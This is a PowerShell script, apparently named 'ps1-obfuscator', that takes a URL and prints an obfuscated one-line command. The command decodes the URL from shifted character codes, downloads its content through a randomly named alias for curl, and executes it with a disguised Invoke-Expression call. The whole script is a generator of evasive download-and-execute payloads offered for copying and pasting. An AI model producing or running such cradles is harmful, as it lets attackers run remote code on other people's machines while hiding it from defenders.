Write-Host "ps1-obfuscator by fkxdr"
$url = Read-Host "`nEnter URL to obfuscate"
Write-Host "`nGenerating command...`n"

function Generate-RandomName($length) {
    $chars = "abcdefghijklmnopqrstuvwxyz"
    $name = -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $name
}

function Obfuscate-Url($inputUrl) {
    $asciiArray = @()
    foreach ($char in $inputUrl.ToCharArray()) {
        $asciiValue = [int][char]$char + 8787
        $asciiArray += $asciiValue
    }
    return $asciiArray
}

$obfuscatedArray = Obfuscate-Url $url
$randomVarName1 = Generate-RandomName(5)
$randomVarName2 = Generate-RandomName(5)
$aliasName = Generate-RandomName(5)

# Correctly escaping $ to ensure that the generated script works as expected
$obfuscatedScript = @"
powershell -Command `"new-alias $aliasName curl; `$$randomVarName1 = @($($obfuscatedArray -join ',')); `$$randomVarName2 = ''; foreach (`$asciiValue in `$$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$$randomVarName2)`"
"@

# Output the obfuscated script for copying and pasting
Write-Host $obfuscatedScript
